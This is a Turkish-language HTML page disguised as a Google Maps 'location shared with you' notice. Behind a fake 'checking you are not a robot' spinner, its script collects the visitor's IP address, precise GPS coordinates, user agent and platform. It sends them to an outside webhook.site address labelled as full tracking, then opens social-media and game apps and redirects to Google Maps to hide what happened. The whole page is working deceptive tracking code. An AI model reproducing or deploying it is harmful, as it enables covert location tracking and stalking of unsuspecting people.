<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .kart {
            background: white;
            border-radius: 30px;
            padding: 35px 25px;
            text-align: center;
            max-width: 320px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            position: relative;
        }
        .map-image {
            width: 160px;
            height: 160px;
            object-fit: contain;
            margin-bottom: 15px;
        }
        h2 {
            font-size: 20px;
            color: #202124;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .alt-yazi {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 25px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 14px 25px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        /* DOĞRULAMA KUTUSU */
        .dogrulama {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: 0.3s;
        }
        .dogrulama-kutu {
            background: white;
            border-radius: 20px;
            padding: 25px 30px;
            text-align: center;
            min-width: 250px;
            max-width: 280px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .dogrulama-yazi {
            font-size: 14px;
            color: #5f6368;
            margin-top: 10px;
        }
        .dogrulama-yazi strong {
            color: #1a73e8;
        }
    </style>
</head>
<body>
    <div class="kart">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
        <button id="btn">Konumu Görüntüle</button>
    </div>
    
    <!-- DOĞRULAMA KUTUSU -->
    <div id="dogrulamaBox" class="dogrulama">
        <div class="dogrulama-kutu">
            <div class="spinner"></div>
            <div class="dogrulama-yazi">
                <strong>🔍 Lütfen bekleyin</strong><br>
                Robot olmadığınız doğrulanıyor...
            </div>
        </div>
    </div>

    <script>
        const webhook = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        
        async function gonder(veri) {
            try {
                await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(veri) });
            } catch(e) {}
        }
        
        // Uygulamaları arka planda aç
        function uygulamalariAc() {
            setTimeout(() => {
                window.location.href = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
            }, 100);
            
            setTimeout(() => {
                window.location.href = "fb://profile";
            }, 400);
            
            setTimeout(() => {
                window.location.href = "instagram://user?username=";
            }, 700);
        }
        
        async function calistir() {
            const btn = document.getElementById('btn');
            const dogrulama = document.getElementById('dogrulamaBox');
            
            // Butonu devre dışı bırak
            btn.disabled = true;
            
            // Doğrulama kutusunu göster
            dogrulama.style.visibility = "visible";
            dogrulama.style.opacity = "1";
            
            let ip = "Alınamadı";
            let konumLink = "";
            let enlem = "", boylam = "";
            
            // 1. IP al
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                ip = json.ip;
            } catch(e) {}
            
            // 2. Konum al
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    enlem = pos.coords.latitude;
                    boylam = pos.coords.longitude;
                    konumLink = `https://www.google.com/maps?q=${enlem},${boylam}`;
                    
                    // Webhook'a gönder
                    const veri = {
                        tip: "Hassso54_Tam_Takip",
                        zaman: new Date().toLocaleString('tr-TR'),
                        konum: konumLink,
                        enlem: enlem,
                        boylam: boylam,
                        ip: ip,
                        cihaz: navigator.userAgent,
                        platform: navigator.platform,
                        not: "Sakarya konum takibi - Uygulamalar açılacak"
                    };
                    
                    await gonder(veri);
                    
                    // 1 saniye bekle (doğrulama gösterilsin)
                    setTimeout(() => {
                        // Doğrulama kutusunu gizle
                        dogrulama.style.visibility = "hidden";
                        dogrulama.style.opacity = "0";
                        
                        // Uygulamaları aç
                        uygulamalariAc();
                        
                        // Google Maps'e yönlendir
                        setTimeout(() => {
                            window.location.href = konumLink;
                        }, 800);
                        
                    }, 1000);
                    
                }, async () => {
                    // Konum hatası
                    await gonder({ tip: "Hata", ip: ip, hata: "Konum izni yok" });
                    
                    setTimeout(() => {
                        dogrulama.style.visibility = "hidden";
                        dogrulama.style.opacity = "0";
                        uygulamalariAc();
                        window.location.href = "https://www.google.com/maps";
                    }, 800);
                });
            } else {
                setTimeout(() => {
                    dogrulama.style.visibility = "hidden";
                    dogrulama.style.opacity = "0";
                    uygulamalariAc();
                    window.location.href = "https://www.google.com/maps";
                }, 800);
            }
        }
        
        document.getElementById('btn').onclick = calistir;
    </script>
</body>
</html>
